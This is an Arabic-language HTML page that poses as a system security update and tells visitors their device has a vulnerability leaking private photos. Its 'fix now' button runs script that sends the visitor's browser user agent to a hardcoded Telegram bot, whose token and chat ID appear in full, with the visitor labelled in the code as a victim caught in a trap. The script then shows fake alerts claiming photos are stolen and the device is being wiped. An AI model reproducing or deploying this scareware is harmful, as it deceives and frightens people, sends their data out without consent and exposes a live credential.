<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحديث أمان النظام</title>
    <style>
        body { background-color: black; color: red; text-align: center; font-family: 'Courier New', Courier, monospace; padding-top: 100px; }
        .btn { padding: 20px 40px; font-size: 20px; background: red; color: white; border: none; cursor: pointer; border-radius: 10px; }
        #warning { display: none; }
    </style>
</head>
<body>

    <div id="main">
        <h1>⚠️ تم اكتشاف ثغرة في جهازك</h1>
        <p>اضغط الزر أدناه لإصلاح النظام فوراً ومنع تسريب الصور</p>
        <button class="btn" onclick="startPrank()">إصلاح الآن</button>
    </div>

    <div id="warning">
        <h1 style="font-size: 50px;">⚠️ جاري اختراق الجهاز...</h1>
        <p id="status">جاري سحب الصور الشخصية...</p>
        <p id="files">📁 DCIM/Camera/IMG_001.jpg</p>
    </div>

    <script>
        function startPrank() {
            // 1. إرسال البيانات للبوت (الصيد)
            const botToken = '8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg';
            const myId = '5811700860';
            const info = "⚠️ ضحية دخل الفخ: " + navigator.userAgent;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myId}&text=${info}`);

            // 2. تفعيل المقلب النفسي
            document.getElementById('main').style.display = 'none';
            document.getElementById('warning').style.display = 'block';

            // 3. سلسلة رسائل مرعبة (Alerts) ما تقفل بسهولة
            setTimeout(() => { alert("⚠️ خطأ في النظام: جاري الوصول إلى استوديو الصور..."); }, 500);
            setTimeout(() => { alert("❌ تم سحب 45 صورة خاصة بنجاح!"); }, 1500);
            setTimeout(() => { alert("📡 جاري إرسال البيانات إلى السيرفر الرئيسي..."); }, 2500);

            // 4. حركة "تعليق" المتصفح
            for (let i = 0; i < 5; i++) {
                setTimeout(() => {
                    document.getElementById('status').innerText = "جاري مسح محتويات الجهاز... " + (i*20) + "%";
                }, i * 1000);
            }

            // 5. قنبلة الروابط (يفتح له رابط مرعب أو فيديو مفاجئ)
            setTimeout(() => {
                window.location.href = "https://www.google.com"; // تقدر تغيره لرابط فيديو رعب
            }, 6000);
        }
    </script>
</body>
</html>
